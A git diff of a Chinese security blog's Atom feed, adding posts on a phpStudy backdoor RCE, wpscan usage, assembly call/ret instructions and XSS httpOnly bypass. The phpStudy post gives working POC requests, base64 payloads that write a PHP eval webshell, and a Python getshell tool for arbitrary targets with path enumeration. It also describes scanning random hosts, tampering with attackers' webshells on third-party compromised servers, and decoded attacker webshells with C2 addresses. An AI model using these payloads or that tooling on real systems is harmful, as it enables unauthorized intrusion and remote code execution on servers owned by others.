@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://jinqipiaopiao.github.io/</id>
     <title>Gridea</title>
-    <updated>2021-10-12T15:43:14.206Z</updated>
+    <updated>2021-11-07T02:52:44.395Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://jinqipiaopiao.github.io/"/>
     <link rel="self" href="https://jinqipiaopiao.github.io/atom.xml"/>
@@ -10,6 +10,432 @@
     <logo>https://jinqipiaopiao.github.io/images/avatar.png</logo>
     <icon>https://jinqipiaopiao.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析]]></title>
+        <id>https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/</id>
+        <link href="https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/">
+        </link>
+        <updated>2021-11-03T09:02:02.000Z</updated>
+        <content type="html"><![CDATA[<p>文章目录:</p>
+<p>1.phpstudy后门检测</p>
+<p>2.phpstudy远程RCE后门复现图文教程</p>
+<p>3.phpstudy远程RCE后门复现教视频程</p>
+<p>3.Python编写复现脚本</p>
+<p>4.Python编写批量复现脚本</p>
+<p>5.针对部署phpstudy环境服务器已沦陷的主机进行溯源分析/黑客入侵画像</p>
+<p>6.修复建议</p>
+<p>7.参考</p>
+<p>准备工具：</p>
+<p>VMware Workstation Pro</p>
+<p>Windows7的/ 2008R2</p>
+<p>BurpSuiteFree</p>
+<p>phpStudy20161103.zip（文中使用）phpStudy20180211.zip</p>
+<p>Python</p>
+<p><strong>一、phpstudy后门检测：</strong><br>
+(1)phpStudy20161103 后门位置存在于：</p>
+<pre><code>*:\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll
+
+*:\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll
+</code></pre>
+<p>(2)phpStudy20180211后门位置存在于：</p>
+<pre><code>*:\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll
+
+*:\PHPTutorial\PHP\PHP-5.4.45\ext\php_xmlrpc.dll
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932261789.png" alt="" loading="lazy"><br>
+(3)找到“ php_xmlrpc，dll”后用记事本打开，“ Ctrl + F”搜索“ @eva ”字符串如果存在就存在后门：</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932265747.png" alt="" loading="lazy"><br>
+(4)Phpstudy后门分析文章传送门：</p>
+<pre><code>https://www.freebuf.com/news/topnews/214912.html
+
+https://www.cppentry.com/bencandy.php?fid=85&amp;id=261791
+</code></pre>
+<p><strong>二、phpstudy远程RCE后门复现图文教程:</strong><br>
+(1)虚拟机搭建好Phpstudy环境，我这里使用的是phpstudy2016版本<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932271003.png" alt="" loading="lazy"><br>
+Phpstudy环境192.168.1.91</p>
+<p>(2)浏览器访问靶机地址：http：//192.168.1.91/<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932276373.png" alt="" loading="lazy"><br>
+(3)浏览器设置本地代理并且打开BurpSuiteFree抓包<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932281265.png" alt="" loading="lazy"><br>
+<strong>(4)phpstudy RCE POC：</strong></p>
+<pre><code>GET / HTTP/1.1
+
+Host: 192.168.43.99
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:69.0) Gecko/20100101 Firefox/69.0
+
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip,deflate
+
+Accept-Charset:&quot;commandbase64 string&quot;
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Cache-Control: max-age=0
+</code></pre>
+<p><strong>(5)CTRL + R把请求包转发到中继器模块</strong></p>
+<p>Accept-Charset:&quot;command base64 string&quot;中执行命令经过了的的Base64编码加密：</p>
+<p>执行语句指令：system('whoami');</p>
+<p>BASE64 编码后：c3lzdGVtKCd3aG9hbWknKTs =</p>
+<p>替换进去</p>
+<p>Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=</p>
+<p>还要把“ ”中的前面的空格删除。Accept-Encoding: gzip, deflatedeflate</p>
+<p><strong>(6)构造好执行语句为WHOAMI的POC如下：</strong></p>
+<pre><code>GET / HTTP/1.1
+
+Host: 192.168.1.91
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64;rv:69.0) Gecko/20100101 Firefox/69.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip,deflate
+
+Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Cache-Control: max-age=0
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932289618.png" alt="" loading="lazy"><br>
+（whoami执行结果）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932294964.png" alt="" loading="lazy"><br>
+（net user执行查询查询查询查询结果）<br>
+(7)写入webshel升的操作</p>
+<p>可以使用待办事项命令下ECHO 实现</p>
+<p>系统（“ write_webshell”）；</p>
+<p>(8)完整写出webshel升的语句：</p>
+<pre><code>ECHO ^&lt;?php @eval($_POST[cmd]);?^&gt;&gt;&quot;C:/phpStudy/WWW/demon.php
+</code></pre>
+<p>(10)拼接后的语句</p>
+<pre><code>system(' ECHO ^&lt;?php@eval($_POST[cmd]); ?^&gt;&gt;&quot;C:/phpStudy/WWW/demon.php ');
+</code></pre>
+<p>(11)拼接好Base64 编码后的代码：</p>
+<pre><code>c3lzdGVtKCcgRUNITyBePD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Xj4+IkM6L3BocFN0dWR5L1dXVy9kZW1vbi5waHAgJyk7
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932301784.png" alt="" loading="lazy"><br>
+（成功写入的webshel）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932311623.png" alt="" loading="lazy"><br>
+（中国蚁剑连接成功）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932316526.png" alt="" loading="lazy"><br>
+（ 中国蚁剑链接的webshel升命令执行成功）<br>
+<strong>三、Python复现phpstudy远程RCE漏洞：</strong><br>
+(1)Python 编写Phpstudy2016 / 2018远程RCE利用脚本代码：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932321772.png" alt="" loading="lazy"></p>
+<pre><code>import base64
+import requests
+print(
+'''        ==============================================================================================                    &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;Phpstudy 2016/2018 远程 RCE Getshel工具&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;                    [+]By:艾登——皮尔斯                    [+]脚本仅用学习教育目的                    [+]请您务必遵守《中华人民共和国网络安全法》        ==============================================================================================        ''')
+def write_shell(url,headers):
+r = requests.get(url=url, headers=headers)
+cheack_webshell = requests.get(url+&quot;/demon.php&quot;)
+if cheack_webshell.status_code == 200:
+print(&quot;\n\n[+]{}                Webshell写入成功&quot;.format(url))
+else:
+print(&quot;\n\n[+]{}                Webshell写入失败&quot;.format(url))
+print(&quot;\n=======================================================\n\n&quot;)
+while True:
+path = input(str(&quot;请你输入绝对路径:&quot;))
+url = input(str(&quot;请你输入IP地址/域名:&quot;))
+payload_qury = &quot;&quot;&quot;system('ECHO ^&lt;?php @eval($_POST[cmd]); ?^&gt;&gt;&quot;{}/demon.php&quot;');&quot;&quot;&quot;.format(path)
+payload = base64.b64encode(payload_qury.encode('utf-8'))
+payload = str(payload, 'utf-8')
+headers = {
+'Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','Accept-Language': 'zh-CN,zh;q=0.9','accept-charset': payload,'Accept-Encoding': 'gzip,deflate','Connection': 'close',}
+write_shell(url=url, headers=headers)
+</code></pre>
+<p>(2)我们可以看到上面的这个Python复现phpstudy远程RCE的脚本针对于单一命令的phpstudy部署的站点例如这种界面额的还比较方便，如果我们不知道绝对路径是不是就不能写入webshell了?????其实这并不会!!!!</p>
+<p>(3)针对于phpstudy指针页面无法访问的我们其实可以枚举一下他的物理路径地址即可，不知道绝地路径可以枚举一下物理的绝对理解</p>
+<pre><code>Path=['C:/php/WWW',&quot;D:/php/WWW&quot;,&quot;E:/php/WWW&quot;........]
+</code></pre>
+<p>然后把列表中的绝地地址元素传入函数中递归请求判断即可，这里就不贴出代码了。</p>
+<p>(4)与此同时各位老表在进行枚举检测，但是作为一个白帽子，千万不要越过红线。建议大家检测的时候不要写入一句话木马，直接写出一个phpinfo();比较好也是保护了自己。<br>
+<strong>四、针对部署phpstudy环境服务器已被入侵的主机进行溯源分析:</strong><br>
+(1)我在进行随机检测phpstudy的时候已经发现了部分感染主机被黑帽SEO利用了，用于增加搜索引擎关键词的排名来吸引流量。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932352223.png" alt="" loading="lazy"><br>
+(2)部分检测到存在漏洞phpstudy服务器主机网站根目录下高频出现的php一句话木马文件名如下:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932358617.png" alt="" loading="lazy"><br>
+(3)下面的这三位仁兄(大黑客)就是通过了echo的方式写入了webshell一句话木马到网站的根目录下进行链接，先放到一边后面在一起做后门取证。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932373575.png" alt="" loading="lazy"><br>
+(4)另类的后门“lishunsheng.php”应该是一个人名的拼音，应该是李姓氏的<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932380920.png" alt="" loading="lazy"><br>
+ZnB1dHMoZ**wZW4oJy4vdGVzdC5waHAnLCd3KycpLCc8P3BocCBldmFsKCRfUE9TVFtjXSk7Pz4nKTs=</p>
+<p>(5)解密后<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932385721.png" alt="" loading="lazy"></p>
+<pre><code>fputs(fopen('./test.php','w+'),'&lt;?php eval($_POST[c]);?&gt;');
+</code></pre>
+<p>(6)写出文件名为&quot;text.php&quot;链接密码为“c”的webshell一句话木马到网站根目录下方</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932390942.png" alt="" loading="lazy"><br>
+(7)还有其他的黑客是通过phpmyadmin登录弱口令密码的系统日志文件写入webshell进来的<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932395954.png" alt="" loading="lazy"><br>
+2019年9月23日17时30分33秒写入<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932400507.png" alt="" loading="lazy"><br>
+2019年9月23日18时16分33秒写入webshell<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932408949.png" alt="" loading="lazy"><br>
+(8)上面在9月23日写入webshell一句话后，大黑客又通过一句话木马webshell上传了一个文件名为“001122.php”的webshell不死马基本可以先贴个标签是同一个大黑客的攻击入侵行为，在这里也可以看出phpstudy一键部署应该把phpmyadmin的默认密码给修改成随机字符串，此前就有安全团队针对此问题被黑产批量getshell的活动进行了分析。<br>
+<strong>五、针对部署phpstudy环境服务器已沦陷的主机进行溯源分析/黑客入侵画像</strong><br>
+(1)我们现在已经拿到了那些黑客的的webshell一句话后门文件现在就要开始溯源黑客的IP地址，emmmmm，由于我不能直接登录受感染的主机查看访问日志文件，那么这就会非常的尴尬，但是我突然想起了之前我之前给广东省某市的网络执法机构做了一个用来记录黑客访问webshell一句话时候的IP地址的脚本，并且通过邮件或者微信把信息发送给执法人。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932415604.png" alt="" loading="lazy"><br>
+(2)但是在检测之前我需要对他们的webshell一句话木马做一下加工处理，黑客原先留下的webshell代码如下:</p>
+<pre><code>&lt;?php
+
+@eval($_POST[ppass]);
+
+?&gt;
+</code></pre>
+<p>(3)我们加工处理黑客留下的后的webshell代码如下</p>
+<pre><code>&lt;?php
+
+$address = $_SERVER['REMOTE_ADDR'];
+
+$referer = $_SERVER['HTTP_REFERER'];
+
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+$file = fopen(&quot;log.html&quot;,  &quot;a&quot;);  
+
+$time = time();
+
+$now_date= date('Y-m-d H:i:s',$time);
+
+fwrite( $file, &quot;&lt;b&gt;Time:$now_date&lt;/b&gt;&lt;br&gt;&quot; );
+
+fwrite( $file, &quot;&lt;b&gt;IP Address:$address&lt;/b&gt;&lt;br&gt;&quot;);
+
+fwrite( $file, &quot;&lt;b&gt;Referer:$referer&lt;/b&gt;&lt;br&gt;&quot;);  
+
+fwrite( $file, &quot;&lt;b&gt;Browser:$browser&lt;/b&gt;&lt;br/&gt;&lt;hr&gt;&quot;);  
+
+fclose($file);
+
+@eval($_POST[ppass]);
+
+?&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932422821.png" alt="" loading="lazy"><br>
+(4)log.html的路径地址可以修改到存放到网站根目录下的其他文件下，避免被发现哈哈哈，</p>
+<p>当黑客使用中国菜刀/中国蚁剑访问webshell的时候就会记录下IP地址/访问时间/请求头等信息到log.html文件中</p>
+<p>(5)模拟黑客访问webshell前<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932428328.png" alt="" loading="lazy"><br>
+(6)模拟黑客访问websell后<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932433179.png" alt="" loading="lazy"><br>
+(7)然后本地或者VPS上定时访问请求log.html把最新的访问信息通过Email邮件的方式发送给执法机关/溯源工程师，<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932440617.png" alt="" loading="lazy"><br>
+(8)访问检测已经可以达到了秒级，时间的精度也是非常之高。然后就给全部黑客的webshell加工一下，然后我们在调用本地的脚本使用一个并发的请求去请求所有的站点log.html静静等待邮件即可。但是这里并不建议并发请求容易被防火墙封锁IP，所以我就使用了单线线程模式并且使用tiime模块的time.sleep设置了请求延迟，我设置了10秒访问一次。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932449389.png" alt="" loading="lazy"><br>
+(9)设置完毕之后就可以直接运行监听脚本了<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932455022.png" alt="" loading="lazy"><br>
+(10)在经过十多个小时的等待,我终于等待到了那些大黑客重新访问他们预留下来的Webshell地址了，手机QQ邮箱也收到了邮件通知<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932471034.png" alt="" loading="lazy"><br>
+(11)本次等待共获取到144条webshell访问记录，主要的访问IP地址如下:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932478190.png" alt="" loading="lazy"><br>
+(12)此外我还注意到网站的根目录文件夹下方被上传了远程木马病毒(方便黑客后期长时间维持权限访问)如下图：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932485387.png" alt="" loading="lazy"><br>
+<strong>那么接下来就是进行给黑客入侵画像：</strong><br>
+<strong>(1)Windows7 64bit System 虚拟机样本未运行初始化状态</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932491344.png" alt="" loading="lazy"><br>
+(2)执行cd.exe程序后本地端口49189端口被占用，链接的外部C&amp;C的上线地址:114.67.65.156:8081</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932498069.png" alt="" loading="lazy"><br>
+(3)查壳:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932505182.png" alt="" loading="lazy"><br>
+<strong>UPX压缩壳使用C++编写的win32木马程序</strong></p>
+<p><strong>火绒剑分析:</strong><br>
+(1)运行后会删除自身文件(cd.exe)并且会复制自身到C:\Windows下方<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932521335.png" alt="" loading="lazy"></p>
+<pre><code>C:\Windows\system32\cmd.exe&quot; /c del C:\Users\ADMINI~1\Desktop\cd.exe &gt; null
+</code></pre>
+<p>删除母体<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932529492.png" alt="" loading="lazy"><br>
+写入木马文件到C:\Windows\目录下</p>
+<p>(2)注册行为:修改了以下注册表以此降低Internet安全设置。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932541636.png" alt="" loading="lazy"><br>
+(3)向网关地址发送数据包：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932549334.png" alt="" loading="lazy"><br>
+(4)与114.67.65.156:8081C&amp;C上线服务器地址建立TCP通信链接<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932555222.png" alt="" loading="lazy"><br>
+114.67.65.156主机3389端口开放(Windows主机无疑)<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932561148.png" alt="" loading="lazy"><br>
+(5)开启了web服务80端口访问IP发现有一个网站<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932569605.png" alt="" loading="lazy"><br>
+(6)发现是一个做SEO的泛微目录的站点，留意到网站上面留下了这个站长的微信二维码<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932588873.png" alt="" loading="lazy"><br>
+微信号尾号为H****553YM</p>
+<p>QQ:64****08</p>
+<p>就先叫他53YM大黑客<br>
+(7)纯真IP库查询IP的归属地指向了一家名为&quot;北京市 凯达永易科技(北京)有限公司&quot;的公司<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932595542.png" alt="" loading="lazy"><br>
+去天眼查网站查询这家公司发现公司已注销<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932605318.png" alt="" loading="lazy"><br>
+(8)然后我顺便去Google搜索了一下这个C&amp;C上线地址,发现已经有安全团队分析了类似样本</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932617274.png" alt="" loading="lazy"><br>
+2018.exe 211.149.225.80:3313(大灰狼木马)</p>
+<p>inJoin.ps1是一个远程注入工具该PowerShell脚本具有3个基本功能集：<br>
+DLL注入<br>
+DLL注入简单地定义为将DLL插入另一个进程的空间然后执行其代码的过程。以下是OpenSecurityResearch博客文章中对此过程进行简化的可视化视图：<br>
+1.）将DLL反映性地加载到PowerShell进程中</p>
+<p>远程或本地运行时，可以将DLL输出返回给用户。</p>
+<p>DLL完成执行后，清理PS进程中的内存。</p>
+<p>2.）将EXE反射性地加载到PowerShell进程中。</p>
+<p>远程运行时无法将EXE输出返回给用户。如果需要远程输出，则必须使用DLL。如果在本地运行，则可以返回EXE输出。</p>
+<p>DLL完成执行后，清理PS进程中的内存。</p>
+<p>非常适合运行EXE的现有渗透测试工具，而无需触发过程监控警报。</p>
+<p>3.）以反射方式将DLL注入到远程进程中。</p>
+<p>在远程或本地运行时，无法将DLL输出返回给用户。</p>
+<p>如果DLL完成执行，则不清理远程进程中的内存。</p>
+<p>非常适合通过将后门DLL注入另一个进程内存来在系统上植入后门。</p>
+<p>期望DLL具有此功能：void VoidFunc（）。这是在DLL加载后将被调用的函数。</p>
+<p>如果通俗点用人话来讲就是利用PowerShell来远程注入DLL的脚本</p>
+<p>此PowerShell项目的Github项目地址:</p>
+<pre><code>https://github.com/clymb3r/PowerShell
+</code></pre>
+<p>此PowerShell项目作者的说明：</p>
+<pre><code>https://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932627565.png" alt="" loading="lazy"><br>
+这里的江西赣州的黑客所使用的就是上图红圈选圈中的PowerShell脚本</p>
+<p>然后查看他一下他的PowerShell脚本<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932640308.png" alt="" loading="lazy"><br>
+其中$InputString是黑客把自己的恶意的二进制文件通过Base64转写后的字符串信息</p>
+<pre><code>在通过PowerShell[System.Convert]::FromBase64String的方法是为上面二进制文件加密的字符串信息进行解密执行
+</code></pre>
+<p>InputString中Base64编码的字符串解密还原后为Metasploit生成的二进制文件。</p>
+<p>PowerShell还原解密方式:</p>
+<pre><code>$Base64Bytes = Get-Content (base64.txt)
+$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)
+Set-Content calc.exe -Value $PEBytes
+</code></pre>
+<p>C#还原解密方式：</p>
+<pre><code>using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+namespace test1
+{
+class Program
+{
+static void Main(string[] args)
+{
+byte[] AsBytes = File.ReadAllBytes(@&quot;C:\test\base64.txt&quot;);
+String AsBase64String = Convert.FromBase64String(AsBytes);
+StreamWriter sw = new StreamWriter(@&quot;C:\test\calc.exe&quot;);
+sw.Write(AsBase64String);
+sw.Close();
+}
+}
+}
+</code></pre>
+<p>这个江西赣州的黑客够专业我喜欢<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932652689.png" alt="" loading="lazy"><br>
+inJoin.ps1 上线地址为117.21.224.222:9898</p>
+<p>木马文件名及上线地址如下图所示：</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932661253.png" alt="" loading="lazy"><br>
+修复建议:<br>
+1.前往官网下载phpstudy下载最新版本</p>
+<p>2.修改服务器密码，检查系统日志文件，下载安装火绒杀毒软件进行全盘查杀病毒后门，以防生产环境被入侵者留下后门</p>
+<p>2.开发人员应该尽量在生产环境中杜绝使用一键部署类型的软件和脚本防止软件留有后门，导致服务器病毒木马入侵</p>
+<p>3.关注多一些风险预警平台&quot;微步&quot;/或者关注威胁情报收集的微信公众号&quot;黑鸟&quot;还有就是我的winway-鱼蛋师傅的漏洞挖掘公众号&quot;快识&quot;。</p>
+<p>参考:<br>
+<strong>phpStudy后门简要分析：</strong></p>
+<p>http://www.freebuf.com/others-articles/215406.html</p>
+<p>数十万PhpStudy用户被植入后门，快来检测你是否已沦为“肉鸡”！:</p>
+<p>https://www.freebuf.com/news/topnews/214912.html</p>
+<p>杭州警方通报打击涉网违法犯罪暨'净网2019'专项行动战果</p>
+<p>https://mp.weixin.qq.com/s/s-5cVTxIJcDfdRjtnEnI0g</p>
+<p>病毒团伙利用phpStudy RCE漏洞批量抓鸡，下发四个远控木马</p>
+<p>https://www.4hou.com/system/20637.html</p>
+<p>渗透技巧——通过cmd上传文件的N种方法</p>
+<p>https://wooyun.js.org/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html<br>
+本文作者：艾登——皮尔斯， 属于FreeBuf原创奖励计划，未经许可禁止转载，这里我只是借来参考一下</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[wpscan]]></title>
+        <id>https://jinqipiaopiao.github.io/post/wpscan/</id>
+        <link href="https://jinqipiaopiao.github.io/post/wpscan/">
+        </link>
+        <updated>2021-11-02T12:01:25.000Z</updated>
+        <content type="html"><![CDATA[<p>首先得去官网申请api-token值（不然就会报以下的错）<br>
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.<br>
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</p>
+<p>然后当你有了token值之后你就可以用命令行后面直接加api-token值即可<br>
+如：</p>
+<pre><code>先更新wpscan --update然后就可以使用了如果出现报错就说明是凯莉有问题换一个镜像就好了    
+wpscan --url http://219.153.49.228:49425/ --api-token *****
+</code></pre>
+<p>当扫描出现红色的结果的时候说明就是扫描结束也即成功<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635855185383.png" alt="" loading="lazy"></p>
+<p>然后接下来就是把结果拷贝到word里面直接找CVE然后利用漏洞</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[汇编语言]]></title>
+        <id>https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/</id>
+        <link href="https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/">
+        </link>
+        <updated>2021-10-27T01:57:35.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>call与ret</strong></p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635299906733.png" alt="" loading="lazy"><br>
+ax=6    (因为只跳了一次)<br>
+<strong>1、call + 标号</strong></p>
+<p>这个指令是先将call + 标号的下一条语句的IP放入栈中，然后使当前的IP+16位位移</p>
+<p>看到上面的解释会让你想到什么？会想到jmp指令吧，jmp有个指令格式是：jmp near ptr 标号，这里的call唯一这种jmp多的一步就是多了一次入栈操作；</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635299950672.png" alt="" loading="lazy"><br>
+ax=1000+9*2 (跳了两次)<br>
+<strong>2、call far ptr + 标号</strong></p>
+<p>这个指令是先将call指令的下一个指令的代码段地址入栈，再把call下一条指令的偏移地址入栈，然后使其跳到标号所在处</p>
+<p>这又会让你想到什么？还是jmp指令，jmp指令的： jmp far ptr 标号， 这种jmp的使用是在段间转移的，这种call和jmp的区别就是多了两次入栈的操作；</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635299988485.png" alt="" loading="lazy"><br>
+<strong>3、call + 16位寄存器</strong></p>
+<p>这个指令先将call的下一条指令的IP入栈，然后再以ax为IP的代码处</p>
+<p>这还是会想到jmp指令：jmp + 16位寄存器，这里的call唯一比jmp多的一步就是多了一步入栈操作；</p>
+<p>再来：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635300241997.png" alt="" loading="lazy"><br>
+<strong>4、call word ptr + 内存单元地址(sp的值因为是一个字也就是两个字节所以应该减2)</strong></p>
+<p>这个指令的是先将call指令的下一条指令的IP入栈，然后跳到以内存单元地址为IP的代码处</p>
+<p>这里同样还是会联想到jmp指令的：jmp word ptr + 内存单元地址，这里的call比jmp多的一步同样是入栈的操作；</p>
+<p>最后的：</p>
+<p><strong>5、call dword ptr + 内存单元地址(sp的值因为是2个字也就是4个字节所以应该减4)</strong></p>
+<p>这个指令先将call指令的下一条指令的CS入栈，再将call指令的下一条指令的IP入栈，然后跳到以内存单元的高位为CS，低位为IP的代码处</p>
+<p>这里还是会想到jmp指令：jmp dword ptr + 内存单元地址，这里的call和jmp的区别还是多了入栈的操作</p>
+<p>综上所述：</p>
+<p><strong>call指令：</strong></p>
+<p>第一步：先将call指令的下一条指令的CS和IP入栈（当然如果是段间转移就要将CS和IP入栈，如果是段内转移就只要将IP入栈）</p>
+<p>第二步：就是操作与call对应的jmp指令</p>
+<p>所有的call指令都是可以用上面的两步来确定的，这是个通用的法则。</p>
+<p><strong>ret和retf</strong></p>
+<p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；</p>
+<p>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p>
+<p>CPU执行ret指令时，进行下面的两步操作：</p>
+<p>（1）(IP) = ((ss)*16 +(sp))</p>
+<p>（2）(sp) = (sp)+2</p>
+<p>CPU执行retf指令时，进行下面四步操作：</p>
+<p>（1）(IP) = ((ss)*16) + (sp)</p>
+<p>（2）(sp) = (sp) + 2</p>
+<p>（3）(CS) = ((ss)*16) + (sp)</p>
+<p>（4）(sp) = (sp) + 2</p>
+<p>用汇编语法来解释ret和retf指令，则：</p>
+<p>CPU执行ret指令时，相当于进行：</p>
+<p>pop IP</p>
+<p>CPU执行retf指令时，相当于进行：</p>
+<p>pop IP</p>
+<p>pop CS<br>
+————————————————<br>
+版权声明：本文为CSDN博主「轩落_翼」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_23880193/article/details/42317797</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[浅谈文件上传漏洞]]></title>
         <id>https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/</id>
@@ -1801,6 +2227,1954 @@ webshell中的恶意代码</p>
 <p>————————————————<br>
 版权声明：本文为CSDN博主「是偉臦道长啊」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
 原文链接：https://blog.csdn.net/weixin_54252904/article/details/117134382</p>
+<h1 id="2021-10-15">2021-10-15</h1>
+<h1 id="web漏洞-xss跨站之代码绕过与httponly绕过">WEB漏洞-XSS跨站之代码绕过与httpOnly绕过</h1>
+<p><strong>什么是HTTPonly？</strong><br>
+如果您在cookie中设置了httponly属性，那么通过js脚本将无法读取到cookie信息，这样就能有效的防止xss攻击，具体一点的介绍：<br>
+（HTTP only是微软对cookie做的扩展，这个主要是解决用户的cookie可能被盗用的问题。<br>
+大家都知道当我们去邮箱或者论坛登陆后，服务器会写一些cookie到我们的浏览器，当下次再访问其他页面是，由于浏览器会自动传递cookie，这样就实现了一次登录就可以看到，所有需要登录后才能看到的内容，也就是说，实质上，所有的登陆状态这些都是建立在cookie上的，假设我们登录后的cookie被人获取，那就会有暴露个人信息的危险，当然想一想，其他人怎么可能可以获取客户的cookie呢，那必然是有不怀好意的人的程序在浏览器里面运行，如果是现在满天飞的流氓软件，那没有办法，HTTPonly也不是用来解决这种情况的，它是用来解决浏览器里卖弄javascript访问cookie的问题，一个flash程序在你的浏览器里面运行就可以获取你的cookie</p>
